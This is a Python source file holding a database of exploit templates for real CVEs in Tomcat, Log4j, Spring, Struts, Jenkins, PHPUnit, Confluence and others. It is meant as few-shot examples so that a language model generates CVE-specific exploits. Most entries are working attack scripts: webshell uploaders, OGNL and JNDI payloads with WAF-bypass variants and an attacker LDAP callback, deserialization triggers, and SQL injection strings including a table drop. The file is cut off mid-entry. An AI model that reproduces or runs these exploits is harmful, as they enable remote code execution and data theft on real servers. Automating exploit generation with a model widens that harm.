"""
CVE-Specific Exploit Templates for LLM Few-Shot Learning

This module provides real-world CVE exploit templates that the LLM uses
as few-shot examples to generate accurate, CVE-specific exploits.
"""

from dataclasses import dataclass
from typing import Dict, List, Optional

@dataclass
class CVEExploitTemplate:
    """Template for CVE-specific exploit generation."""
    cve_id: str
    cwe: str
    cwe_name: str
    name: str
    severity: str
    protocol: str
    affected_products: List[str]
    description: str
    exploit_template: str
    success_indicators: List[str]
    references: List[str]


# =============================================================================
# CVE EXPLOIT TEMPLATE DATABASE
# =============================================================================

CVE_EXPLOIT_TEMPLATES: Dict[str, CVEExploitTemplate] = {
    
    # =========================================================================
    # APACHE TOMCAT CVEs
    # =========================================================================
    
    "CVE-2020-9484": CVEExploitTemplate(
        cve_id="CVE-2020-9484",
        cwe="CWE-502",
        cwe_name="Deserialization of Untrusted Data",
        name="Apache Tomcat Session Persistence Deserialization RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Apache Tomcat 7.x", "Apache Tomcat 8.x", "Apache Tomcat 9.x", "Apache Tomcat 10.x"],
        description="When using Apache Tomcat with PersistentManager and FileStore, an attacker can trigger deserialization of untrusted data via a malicious JSESSIONID cookie pointing to a crafted session file.",
        exploit_template='''import requests
import sys

# CVE-2020-9484: Apache Tomcat Session Deserialization RCE
# CWE-502: Deserialization of Untrusted Data
# Requirements:
#   1. PersistentManager configured with FileStore
#   2. Attacker can write files to server (e.g., via file upload)
#   3. Session file path is predictable

target = "{target}"
payload_path = "/tmp/malicious"  # Path to ysoserial payload (without .session extension)

def exploit():
    print(f"[*] CVE-2020-9484 - Session Deserialization RCE")
    print(f"[*] Target: {target}")
    
    # Path traversal via JSESSIONID to load malicious session file
    traversal_payloads = [
        f"../../../../../../..{payload_path}",
        f"..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..{payload_path}",
    ]
    
    for payload in traversal_payloads:
        print(f"[*] Trying JSESSIONID: {payload}")
        
        cookies = {"JSESSIONID": payload}
        headers = {"User-Agent": "CVE-2020-9484-Exploit"}
        
        try:
            response = requests.get(target, cookies=cookies, headers=headers, timeout=10)
            
            # Deserialization often causes 500 error or timeout
            if response.status_code == 500:
                print(f"[+] Possible RCE! Server returned 500 (deserialization triggered)")
                return True
                
        except requests.exceptions.Timeout:
            print(f"[+] Timeout - command may have executed!")
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    print("[*] Step 1: Generate payload with ysoserial")
    print("    java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' > /tmp/malicious.session")
    print("[*] Step 2: Upload malicious.session to target server")
    print("[*] Step 3: Run this exploit")
    exploit()
''',
        success_indicators=["500", "Internal Server Error", "timeout", "deserialize"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2020-9484"]
    ),
    
    "CVE-2020-1938": CVEExploitTemplate(
        cve_id="CVE-2020-1938",
        cwe="CWE-284",
        cwe_name="Improper Access Control",
        name="Apache Tomcat AJP Ghostcat File Read/Include",
        severity="Critical",
        protocol="AJP",
        affected_products=["Apache Tomcat 6.x", "Apache Tomcat 7.x < 7.0.100", "Apache Tomcat 8.x < 8.5.51", "Apache Tomcat 9.x < 9.0.31"],
        description="The AJP connector in Apache Tomcat allows an attacker to read or include files from the webapp, including WEB-INF. Combined with file upload, this leads to RCE.",
        exploit_template='''import socket
import struct
import sys

# CVE-2020-1938: Ghostcat - Apache Tomcat AJP File Read/Include
# CWE-284: Improper Access Control
# Default AJP port: 8009

target_ip = "{target_ip}"
target_port = 8009

def pack_string(s):
    """Pack string for AJP protocol."""
    if s is None:
        return struct.pack(">H", 0xFFFF)
    encoded = s.encode("utf-8")
    return struct.pack(">H", len(encoded)) + encoded + b"\\x00"

def create_ajp_request(uri, filename):
    """Create AJP Forward Request to read files."""
    # Basic AJP request structure
    ajp_data = b""
    ajp_data += struct.pack(">B", 2)  # JK_AJP13_FORWARD_REQUEST
    ajp_data += struct.pack(">B", 2)  # GET method
    ajp_data += pack_string("HTTP/1.1")
    ajp_data += pack_string(uri)
    ajp_data += pack_string("127.0.0.1")
    ajp_data += pack_string("localhost")
    ajp_data += pack_string(target_ip)
    ajp_data += struct.pack(">H", 8080)
    ajp_data += struct.pack(">B", 0)  # is_ssl
    ajp_data += struct.pack(">H", 0)  # num_headers
    
    # Add request attribute for file inclusion
    ajp_data += struct.pack(">B", 0x0A)  # SC_A_REQ_ATTRIBUTE
    ajp_data += pack_string("javax.servlet.include.request_uri")
    ajp_data += pack_string(uri)
    ajp_data += struct.pack(">B", 0x0A)
    ajp_data += pack_string("javax.servlet.include.path_info")
    ajp_data += pack_string(filename)
    ajp_data += struct.pack(">B", 0x0A)
    ajp_data += pack_string("javax.servlet.include.servlet_path")
    ajp_data += pack_string("")
    ajp_data += struct.pack(">B", 0xFF)  # End
    
    # AJP header
    header = struct.pack(">H", 0x1234) + struct.pack(">H", len(ajp_data))
    return header + ajp_data

def exploit():
    print(f"[*] CVE-2020-1938 - Ghostcat AJP File Read")
    print(f"[*] Target: {target_ip}:{target_port}")
    
    files_to_read = [
        "/WEB-INF/web.xml",
        "/WEB-INF/classes/application.properties",
        "/META-INF/context.xml",
    ]
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        print(f"[+] Connected to AJP port {target_port}")
        
        for filepath in files_to_read:
            print(f"[*] Reading: {filepath}")
            request = create_ajp_request("/", filepath)
            sock.send(request)
            response = sock.recv(8192)
            
            if len(response) > 4:
                print(f"[+] SUCCESS - Got {len(response)} bytes")
                print(response[4:500].decode("utf-8", errors="ignore"))
        
        sock.close()
        
    except ConnectionRefusedError:
        print(f"[-] AJP port {target_port} is closed")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["WEB-INF", "web.xml", "servlet", "context"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2020-1938"]
    ),
    
    "CVE-2017-12617": CVEExploitTemplate(
        cve_id="CVE-2017-12617",
        cwe="CWE-434",
        cwe_name="Unrestricted Upload of File with Dangerous Type",
        name="Apache Tomcat PUT Method JSP Upload RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Apache Tomcat 7.x", "Apache Tomcat 8.x < 8.5.23", "Apache Tomcat 9.x < 9.0.1"],
        description="When running with HTTP PUT enabled (readonly=false), an attacker can upload a JSP file using PUT with a trailing slash to bypass the upload filter, achieving remote code execution.",
        exploit_template='''import requests
import time

# CVE-2017-12617: Apache Tomcat PUT JSP Upload RCE
# CWE-434: Unrestricted Upload of File with Dangerous Type
# Requires: DefaultServlet readonly=false

target = "{target}"
shell_name = f"shell_{int(time.time())}.jsp"

# JSP webshell payload
JSP_WEBSHELL = \'\'\'<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {{
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {{
        out.println(line + "<br>");
    }}
}}
%>\'\'\'

def exploit():
    print(f"[*] CVE-2017-12617 - PUT JSP Upload RCE")
    print(f"[*] Target: {target}")
    
    # Bypass techniques for different OS/versions
    bypass_suffixes = [
        "/",           # Trailing slash (Linux)
        "%20",         # URL-encoded space
        "::$DATA",     # NTFS stream (Windows)
        ".",           # Trailing dot
    ]
    
    for suffix in bypass_suffixes:
        jsp_path = f"/{shell_name}{suffix}"
        full_url = f"{target}{jsp_path}"
        
        print(f"[*] Trying: PUT {jsp_path}")
        
        try:
            response = requests.put(
                full_url,
                data=JSP_WEBSHELL,
                headers={"Content-Type": "application/x-jsp"},
                timeout=10
            )
            
            if response.status_code in [200, 201, 204]:
                print(f"[+] Upload successful! Status: {response.status_code}")
                
                # Verify shell
                shell_url = f"{target}/{shell_name}"
                verify = requests.get(f"{shell_url}?cmd=whoami", timeout=10)
                
                if verify.status_code == 200 and len(verify.text) > 0:
                    print(f"[+] RCE CONFIRMED!")
                    print(f"[+] Shell URL: {shell_url}?cmd=<command>")
                    print(f"[+] Output: {verify.text}")
                    return True
                    
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["201", "Created", "whoami", "uid="],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2017-12617"]
    ),
    
    "CVE-2019-0232": CVEExploitTemplate(
        cve_id="CVE-2019-0232",
        cwe="CWE-78",
        cwe_name="OS Command Injection",
        name="Apache Tomcat CGI Servlet Command Injection",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Apache Tomcat 7.x (Windows)", "Apache Tomcat 8.x (Windows)", "Apache Tomcat 9.x (Windows)"],
        description="On Windows, the CGI Servlet passes query string parameters as command line arguments to batch files, allowing command injection via special characters.",
        exploit_template='''import requests
import urllib.parse

# CVE-2019-0232: Apache Tomcat CGI Command Injection (Windows)
# CWE-78: OS Command Injection
# Requires: CGI Servlet enabled, Windows OS

target = "{target}"
cgi_path = "/cgi-bin/test.bat"

def exploit():
    print(f"[*] CVE-2019-0232 - CGI Command Injection")
    print(f"[*] Target: {target}")
    print(f"[*] Platform: Windows only")
    
    # Command injection payloads for Windows batch files
    payloads = [
        "&whoami",
        "|whoami",
        "&dir",
        "&net user",
        "&ipconfig /all",
        "%26whoami",  # URL encoded &
    ]
    
    for payload in payloads:
        full_url = f"{target}{cgi_path}?{payload}"
        print(f"[*] Trying: {cgi_path}?{payload}")
        
        try:
            response = requests.get(full_url, timeout=10)
            
            # Check for command output indicators
            indicators = ["Administrator", "AUTHORITY", "Windows", "Directory of", "User accounts"]
            
            for indicator in indicators:
                if indicator in response.text:
                    print(f"[+] VULNERABLE! Found: {indicator}")
                    print(f"[+] Response:\\n{response.text[:500]}")
                    return True
                    
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["Administrator", "AUTHORITY", "Windows", "Directory of"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-0232"]
    ),
    
    # =========================================================================
    # LOG4J CVEs
    # =========================================================================
    
    "CVE-2021-44228": CVEExploitTemplate(
        cve_id="CVE-2021-44228",
        cwe="CWE-917",
        cwe_name="Expression Language Injection",
        name="Log4Shell - Log4j JNDI Injection RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Apache Log4j 2.0-2.14.1"],
        description="Log4j 2.x allows JNDI lookup in log messages, enabling RCE via ${jndi:ldap://attacker.com/a} payloads.",
        exploit_template='''import requests

# CVE-2021-44228: Log4Shell - JNDI Injection RCE
# CWE-917: Expression Language Injection

target = "{target}"
attacker_ldap = "ldap://YOUR_IP:1389/a"  # Start LDAP/RMI server first

def exploit():
    print(f"[*] CVE-2021-44228 - Log4Shell")
    print(f"[*] Target: {target}")
    print(f"[*] Callback: {attacker_ldap}")
    
    # Injection points - any logged user input
    injection_points = [
        ("User-Agent", "${{jndi:{attacker_ldap}}}"),
        ("X-Forwarded-For", "${{jndi:{attacker_ldap}}}"),
        ("X-Api-Version", "${{jndi:{attacker_ldap}}}"),
        ("Authorization", "Bearer ${{jndi:{attacker_ldap}}}"),
    ]
    
    # Payload variants for WAF bypass
    payloads = [
        f"${{jndi:ldap://{attacker_ldap}}}",
        f"${{jndi:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://{attacker_ldap}}}",
        f"${{${{::-j}}ndi:ldap://{attacker_ldap}}}",
        f"${{jndi:rmi://{attacker_ldap}}}",
    ]
    
    for payload in payloads:
        headers = {{
            "User-Agent": payload,
            "X-Forwarded-For": payload,
            "X-Api-Version": payload,
        }}
        
        print(f"[*] Sending payload in headers...")
        
        try:
            response = requests.get(target, headers=headers, timeout=5)
            print(f"[*] Response: {response.status_code}")
        except:
            pass
    
    print("[*] Check your LDAP server for callbacks!")
    print("[*] Setup: java -jar JNDI-Injection-Exploit.jar -C 'cmd' -A YOUR_IP")

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["callback", "LDAP connection", "RMI connection"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]
    ),
    
    # =========================================================================
    # SPRING FRAMEWORK CVEs
    # =========================================================================
    
    "CVE-2022-22965": CVEExploitTemplate(
        cve_id="CVE-2022-22965",
        cwe="CWE-94",
        cwe_name="Code Injection",
        name="Spring4Shell - Spring Framework RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Spring Framework 5.3.0-5.3.17", "Spring Framework 5.2.0-5.2.19"],
        description="Spring Framework allows class loader manipulation via data binding, leading to RCE through Tomcat's AccessLogValve.",
        exploit_template='''import requests

# CVE-2022-22965: Spring4Shell RCE
# CWE-94: Code Injection
# Requires: JDK 9+, Tomcat deployment

target = "{target}"

def exploit():
    print(f"[*] CVE-2022-22965 - Spring4Shell")
    print(f"[*] Target: {target}")
    
    # Payload to modify AccessLogValve and write JSP shell
    headers = {{"Content-Type": "application/x-www-form-urlencoded"}}
    
    # Step 1: Modify logging pattern to inject JSP code
    payloads = [
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell",
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
    ]
    
    for payload in payloads:
        try:
            response = requests.post(
                target,
                data=payload,
                headers=headers,
                timeout=10
            )
            print(f"[*] Sent: {payload[:50]}... Status: {response.status_code}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    # Step 2: Trigger log write
    print("[*] Triggering shell creation...")
    requests.get(target, headers={{"suffix": "%>//", "c1": "Runtime", "c2": "<%", "DNT": "1"}})
    
    # Step 3: Access shell
    shell_url = target.rstrip("/") + "/shell.jsp"
    print(f"[*] Shell URL: {shell_url}?pwd=j&cmd=whoami")
    
    try:
        r = requests.get(f"{shell_url}?pwd=j&cmd=whoami", timeout=10)
        if r.status_code == 200:
            print(f"[+] RCE CONFIRMED!\\n{r.text}")
    except:
        pass

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["uid=", "whoami", "shell.jsp"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"]
    ),
    
    # =========================================================================
    # GENERAL WEB VULNERABILITIES
    # =========================================================================
    
    "CWE-89": CVEExploitTemplate(
        cve_id="CWE-89",
        cwe="CWE-89",
        cwe_name="SQL Injection",
        name="SQL Injection",
        severity="High",
        protocol="HTTP",
        affected_products=["Generic"],
        description="SQL Injection occurs when user input is concatenated into SQL queries without proper sanitization.",
        exploit_template='''import requests

# CWE-89: SQL Injection
target = "{target}"

def exploit():
    print(f"[*] Testing SQL Injection")
    print(f"[*] Target: {target}")
    
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "admin'--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; DROP TABLE users;--",
        "1' AND (SELECT SLEEP(5))--",  # Time-based blind
    ]
    
    for payload in payloads:
        print(f"[*] Trying: {payload}")
        
        try:
            response = requests.post(
                target,
                data={{"username": payload, "password": "test"}},
                timeout=10
            )
            
            # Check for success indicators
            if any(x in response.text.lower() for x in ["welcome", "logged in", "dashboard"]):
                print(f"[+] SQL Injection successful!")
                return True
                
            if response.elapsed.total_seconds() > 4:
                print(f"[+] Time-based blind SQLi detected!")
                return True
                
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["Welcome", "logged in", "dashboard", "error", "SQL"],
        references=["https://cwe.mitre.org/data/definitions/89.html"]
    ),
    
    "CWE-502": CVEExploitTemplate(
        cve_id="CWE-502",
        cwe="CWE-502",
        cwe_name="Deserialization of Untrusted Data",
        name="Java Deserialization",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Java Applications"],
        description="Insecure deserialization of untrusted data can lead to remote code execution through gadget chains.",
        exploit_template='''import requests
import subprocess

# CWE-502: Java Deserialization RCE
target = "{target}"

def generate_payload(command):
    """Generate ysoserial payload."""
    try:
        result = subprocess.run(
            ["java", "-jar", "ysoserial.jar", "CommonsCollections5", command],
            capture_output=True
        )
        return result.stdout
    except:
        print("[-] ysoserial.jar not found")
        return None

def exploit():
    print(f"[*] Testing Java Deserialization")
    print(f"[*] Target: {target}")
    
    # Common deserialization endpoints
    endpoints = [
        "/api/deserialize",
        "/invoke",
        "/jmx",
        "/remoting",
    ]
    
    gadget_chains = [
        "CommonsCollections5",
        "CommonsCollections6",
        "Jdk7u21",
        "Spring1",
    ]
    
    for endpoint in endpoints:
        print(f"[*] Testing endpoint: {endpoint}")
        
        payload = generate_payload("touch /tmp/pwned")
        if payload:
            try:
                response = requests.post(
                    f"{target}{endpoint}",
                    data=payload,
                    headers={{"Content-Type": "application/x-java-serialized-object"}},
                    timeout=10
                )
                print(f"[*] Response: {response.status_code}")
            except:
                pass

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["500", "Exception", "ClassNotFoundException"],
        references=["https://cwe.mitre.org/data/definitions/502.html"]
    ),
    
    # =========================================================================
    # APACHE STRUTS CVEs
    # =========================================================================
    
    "CVE-2017-5638": CVEExploitTemplate(
        cve_id="CVE-2017-5638",
        cwe="CWE-78",
        cwe_name="OS Command Injection",
        name="Apache Struts 2 OGNL Injection RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Apache Struts 2.3.5-2.3.31", "Apache Struts 2.5-2.5.10"],
        description="Apache Struts 2 allows RCE via a crafted Content-Type header containing OGNL expressions when the Jakarta Multipart parser is used.",
        exploit_template='''import requests

# CVE-2017-5638: Apache Struts 2 OGNL Injection RCE
# CWE-78: OS Command Injection

target = "{target}"

def exploit(cmd="id"):
    print(f"[*] CVE-2017-5638 - Struts2 OGNL Injection")
    print(f"[*] Target: {target}")
    print(f"[*] Command: {cmd}")
    
    # OGNL payload in Content-Type header
    payload = f"""%{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{cmd}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd','/c',#cmd}}:{{'/bin/sh','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}"""
    
    headers = {{
        "Content-Type": payload,
        "User-Agent": "CVE-2017-5638"
    }}
    
    try:
        response = requests.get(target, headers=headers, timeout=10)
        print(f"[*] Response Status: {response.status_code}")
        
        if response.text:
            print(f"[+] Command output:")
            print(response.text)
            return True
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit("whoami")
''',
        success_indicators=["uid=", "root", "www-data"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2017-5638"]
    ),
    
    "CVE-2018-11776": CVEExploitTemplate(
        cve_id="CVE-2018-11776",
        cwe="CWE-78",
        cwe_name="OS Command Injection",
        name="Apache Struts 2 Namespace RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Apache Struts 2.3-2.3.34", "Apache Struts 2.5-2.5.16"],
        description="Apache Struts 2 allows RCE when alwaysSelectFullNamespace is true and the action mapped has a wildcard namespace.",
        exploit_template='''import requests

# CVE-2018-11776: Apache Struts 2 Namespace RCE
# CWE-78: OS Command Injection

target = "{target}"

def exploit(cmd="id"):
    print(f"[*] CVE-2018-11776 - Struts2 Namespace RCE")
    
    # OGNL payload in URL namespace
    payload = f"""/${{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('{cmd}')).(#b=#a.getInputStream()).(#c=new java.io.InputStreamReader(#b)).(#d=new java.io.BufferedReader(#c)).(#e=new char[50000]).(#d.read(#e)).(#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")).(#f.getWriter().println(new java.lang.String(#e))).(#f.getWriter().flush())}}/"""
    
    try:
        response = requests.get(target + payload, timeout=10)
        if response.text:
            print(f"[+] Output: {response.text}")
            return True
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["uid=", "root"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2018-11776"]
    ),
    
    # =========================================================================
    # JENKINS CVEs
    # =========================================================================
    
    "CVE-2019-1003000": CVEExploitTemplate(
        cve_id="CVE-2019-1003000",
        cwe="CWE-94",
        cwe_name="Code Injection",
        name="Jenkins Script Security Sandbox Bypass RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Jenkins Script Security Plugin < 1.50"],
        description="Jenkins Script Security sandbox can be bypassed to execute arbitrary Groovy code, leading to RCE.",
        exploit_template='''import requests

# CVE-2019-1003000: Jenkins Script Security Sandbox Bypass
# CWE-94: Code Injection

target = "{target}"

def exploit():
    print(f"[*] CVE-2019-1003000 - Jenkins Sandbox Bypass")
    print(f"[*] Target: {target}")
    
    # Groovy payload to bypass sandbox
    groovy_payload = """
public class x {{
  public x() {{
    "touch /tmp/pwned".execute()
  }}
}}
"""
    
    # Try different endpoints
    endpoints = [
        "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
        "/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
    ]
    
    for endpoint in endpoints:
        print(f"[*] Trying: {endpoint}")
        
        data = {{
            "sandbox": "true",
            "value": groovy_payload
        }}
        
        try:
            response = requests.post(target + endpoint, data=data, timeout=10)
            print(f"[*] Status: {response.status_code}")
            
            if response.status_code == 200:
                print("[+] Payload sent! Check if command executed.")
                return True
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["200", "OK"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-1003000"]
    ),
    
    # =========================================================================
    # PHP CVEs
    # =========================================================================
    
    "CVE-2017-9841": CVEExploitTemplate(
        cve_id="CVE-2017-9841",
        cwe="CWE-94",
        cwe_name="Code Injection",
        name="PHPUnit Remote Code Execution",
        severity="Critical",
        protocol="HTTP",
        affected_products=["PHPUnit < 4.8.28", "PHPUnit 5.x < 5.6.3"],
        description="PHPUnit allows RCE via /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php which evaluates arbitrary PHP from POST data.",
        exploit_template='''import requests

# CVE-2017-9841: PHPUnit RCE
# CWE-94: Code Injection

target = "{target}"

def exploit(cmd="id"):
    print(f"[*] CVE-2017-9841 - PHPUnit RCE")
    print(f"[*] Target: {target}")
    
    # Common paths to eval-stdin.php
    paths = [
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    ]
    
    php_payload = f'<?php system("{cmd}"); ?>'
    
    for path in paths:
        print(f"[*] Trying: {path}")
        
        try:
            response = requests.post(
                target + path,
                data=php_payload,
                headers={{"Content-Type": "text/plain"}},
                timeout=10
            )
            
            if response.status_code == 200 and response.text:
                print(f"[+] RCE Successful!")
                print(f"[+] Output: {response.text}")
                return True
        except Exception as e:
            print(f"[-] {path}: {e}")
    
    return False

if __name__ == "__main__":
    exploit("whoami")
''',
        success_indicators=["uid=", "www-data", "root"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2017-9841"]
    ),
    
    # =========================================================================
    # WORDPRESS CVEs
    # =========================================================================
    
    "CVE-2019-8942": CVEExploitTemplate(
        cve_id="CVE-2019-8942",
        cwe="CWE-434",
        cwe_name="Unrestricted Upload",
        name="WordPress Image RCE via Crop",
        severity="High",
        protocol="HTTP",
        affected_products=["WordPress < 5.0.1", "WordPress < 4.9.9"],
        description="WordPress allows RCE by authenticated users through image metadata manipulation and crop functionality.",
        exploit_template='''import requests

# CVE-2019-8942: WordPress Image RCE
# CWE-434: Unrestricted Upload
# Requires: Author-level access

target = "{target}"
username = "author"
password = "password"

def exploit():
    print(f"[*] CVE-2019-8942 - WordPress Image RCE")
    print(f"[*] Target: {target}")
    
    session = requests.Session()
    
    # Step 1: Login
    login_url = f"{target}/wp-login.php"
    login_data = {{
        "log": username,
        "pwd": password,
        "wp-submit": "Log In"
    }}
    
    print("[*] Logging in...")
    response = session.post(login_url, data=login_data)
    
    if "dashboard" in response.text.lower():
        print("[+] Login successful!")
    else:
        print("[-] Login failed")
        return False
    
    # Step 2: Upload malicious image with PHP in EXIF
    print("[*] This exploit requires:")
    print("    1. Upload image with PHP payload in EXIF Comment")
    print("    2. Trigger crop action to create new file")
    print("    3. Include via path traversal")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["404", "shell", "php"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-8942"]
    ),
    
    # =========================================================================
    # CONFLUENCE CVEs  
    # =========================================================================
    
    "CVE-2021-26084": CVEExploitTemplate(
        cve_id="CVE-2021-26084",
        cwe="CWE-917",
        cwe_name="Expression Language Injection",
        name="Atlassian Confluence OGNL Injection RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Confluence Server < 7.12.5", "Confluence Server < 7.4.11"],
        description="Confluence Server allows OGNL injection in the Widget Connector macro, leading to RCE.",
        exploit_template='''import requests

# CVE-2021-26084: Confluence OGNL Injection RCE
# CWE-917: Expression Language Injection

target = "{target}"

def exploit(cmd="id"):
    print(f"[*] CVE-2021-26084 - Confluence OGNL Injection")
    print(f"[*] Target: {target}")
    
    # OGNL payload
    payload = f"""%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D"""
    
    endpoints = [
        "/pages/doenterpagevariables.action",
        "/pages/createpage-entervariables.action",
    ]
    
    for endpoint in endpoints:
        url = target + endpoint
        
        data = {{
            "queryString": payload
        }}
        
        print(f"[*] Trying: {endpoint}")
        
        try:
            response = requests.post(url, data=data, timeout=10)
            
            cmd_output = response.headers.get("X-Cmd-Response", "")
            if cmd_output:
                print(f"[+] RCE Successful!")
                print(f"[+] Output: {cmd_output}")
                return True
                
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit("whoami")
''',
        success_indicators=["X-Cmd-Response", "uid="],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-26084"]
    ),
    
    "CVE-2022-26134": CVEExploitTemplate(
        cve_id="CVE-2022-26134",
        cwe="CWE-917",
        cwe_name="Expression Language Injection",
        name="Atlassian Confluence Pre-Auth OGNL RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Confluence Server 7.4.0-7.18.0"],
        description="Unauthenticated RCE via OGNL injection in Confluence Server URL.",
        exploit_template='''import requests
import urllib.parse

# CVE-2022-26134: Confluence Pre-Auth OGNL RCE
# CWE-917: Expression Language Injection

target = "{target}"

def exploit(cmd="id"):
    print(f"[*] CVE-2022-26134 - Confluence Pre-Auth RCE")
    print(f"[*] Target: {target}")
    
    # OGNL payload in URL path
    payload = f"""/${{(@java.lang.Runtime@getRuntime().exec("{cmd}"))}}"""
    encoded_payload = urllib.parse.quote(payload, safe='')
    
    url = target + encoded_payload
    
    print(f"[*] Sending payload...")
    
    try:
        response = requests.get(url, timeout=10, allow_redirects=False)
        print(f"[*] Status: {response.status_code}")
        
        # Command might execute even with error response
        if response.status_code in [302, 500]:
            print("[+] Payload sent! Command may have executed.")
            return True
            
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit("id")
''',
        success_indicators=["302", "500"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2022-26134"]
    ),
    
    # =========================================================================
    # GITLAB CVEs
    # =========================================================================
    
    "CVE-2021-22205": CVEExploitTemplate(
        cve_id="CVE-2021-22205",
        cwe="CWE-94",
        cwe_name="Code Injection",
        name="GitLab ExifTool RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["GitLab CE/EE 11.9-13.10.2"],
        description="GitLab allows unauthenticated RCE via malicious image file processed by ExifTool.",
        exploit_template='''import requests

# CVE-2021-22205: GitLab ExifTool RCE
# CWE-94: Code Injection

target = "{target}"

def create_malicious_image(cmd):
